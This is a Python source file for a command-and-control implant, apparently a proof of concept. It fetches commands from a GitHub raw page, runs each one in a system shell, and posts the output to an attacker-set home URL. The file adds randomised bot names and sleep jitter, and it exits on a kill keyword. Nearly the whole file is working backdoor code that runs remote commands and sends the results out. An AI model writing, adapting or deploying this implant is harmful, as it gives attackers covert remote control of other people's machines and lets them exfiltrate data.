import random
import string
import subprocess
from time import sleep
import requests
from bs4 import BeautifulSoup
import re


global ET_HOME
global ET_PHONE
global ET_STATUS
global ET_NAME
global ET_URL
global ET_PAGE
global ET_BRAIN
global ET_BRAIN_CELL
global ET_BRAIN_OLDCELL

def ET_GET_NAME(length):
    # With combination of lower and upper case
    return(''.join(random.choice(string.ascii_letters) for i in range(length)))
    

     
def GET_ET_BRAIN():
    ET_PAGE = requests.get(ET_URL)
    return re.findall('---(.+?)---', ET_PAGE.text)
    
def ET_GET_HOME():
    ET_HOME = re.findall('-M-(.+?)-M-', ET_PAGE.text)[0]
    print(ET_HOME)
def ET_POST_HOME_FIRST_TIME():    
    ET_BRAIN_CELLS=GET_ET_BRAIN()
    ET_BRAIN_OLDCELL = ET_BRAIN_CELLS
    ET_HOME= re.findall('-M-(.+?)-M-', ET_PAGE.text)[0]
    if(ET_BRAIN_CELLS[0]== "start-C2") or (ET_STATUS == 1):
        ET_STATUS = 1
        for ET_BRAIN_CELL in ET_BRAIN_CELLS:
            try:
                ET_BRAIN_PROCESS =subprocess.Popen(ET_BRAIN_CELL, shell= True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                ET_BRAIN_OUT = ET_BRAIN_PROCESS.stdout.read()+ET_BRAIN_PROCESS.stderr.read()
                requests.post(ET_HOME, data={'StormtrooperID':ET_NAME,'StormtrooperAction':ET_BRAIN_CELL,'StormtrooperMindTrick': ET_BRAIN_OUT})
            except:
                sleep(1)
                
                pass;
    elif(ET_BRAIN_CELLS[0]== "XCOMLOST"):
        exit()
def ET_POST_HOME():
    if ET_BRAIN_OLDCELL !=GET_ET_BRAIN() :
        ET_POST_HOME_FIRST_TIME()




#print(page.text)
#soup = BeautifulSoup(page.text, 'html.parser')
#print(soup.prettify())
if __name__ == '__main__':
    ET_URL ="https://raw.githubusercontent.com/Huleinpylo/C2_POC/main/xcom-Order66"
    ET_NAME = ET_GET_NAME(random.randrange(8,15))
    ET_PAGE = requests.get(ET_URL)  
    ET_GET_HOME()
    ET_POST_HOME_FIRST_TIME()
    while True:
        sleep(random.randrange(2,15))
        ET_GET_HOME()
        

